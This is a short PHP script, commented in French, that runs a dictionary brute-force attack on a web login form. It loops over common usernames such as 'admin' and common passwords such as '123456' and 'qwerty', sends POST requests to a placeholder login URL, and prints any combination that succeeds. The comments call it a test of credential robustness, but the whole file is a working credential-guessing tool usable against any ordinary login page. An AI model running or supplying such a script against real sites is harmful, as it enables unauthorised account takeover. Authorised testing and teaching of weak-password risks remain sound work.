<?php
// Exemple de script PHP pour tester la robustesse des identifiants de connexion par brute force

// Liste des noms d'utilisateur à tester
$usernames = [
    'admin',
    'user',
    'test',
    // Ajoutez d'autres noms d'utilisateur courants ici
];

// Liste des mots de passe à tester
$passwords = [
    '123456',
    'password',
    '123456789',
    '12345678',
    '12345',
    '1234567',
    '1234567890',
    'qwerty',
    'abc123',
    // Ajoutez d'autres mots de passe courants ici
];

// URL de la page de connexion
$loginUrl = 'https://example.com/login';

// Fonction pour envoyer une requête POST à la page de connexion
function attemptLogin($url, $username, $password) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => $username,
        'password' => $password,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Vérifiez si la connexion a réussi (par exemple, en recherchant une chaîne spécifique dans la réponse)
    if ($httpCode == 200 && strpos($response, 'Bienvenue') !== false) {
        return true;
    }
    return false;
}

// Tester chaque combinaison d'identifiants et de mots de passe
foreach ($usernames as $username) {
    foreach ($passwords as $password) {
        if (attemptLogin($loginUrl, $username, $password)) {
            echo "Connexion réussie avec l'utilisateur : $username et le mot de passe : $password\n";
            break 2; // Sortir des deux boucles si la connexion réussit
        } else {
            echo "Tentative échouée avec l'utilisateur : $username et le mot de passe : $password\n";
        }
    }
}
?>
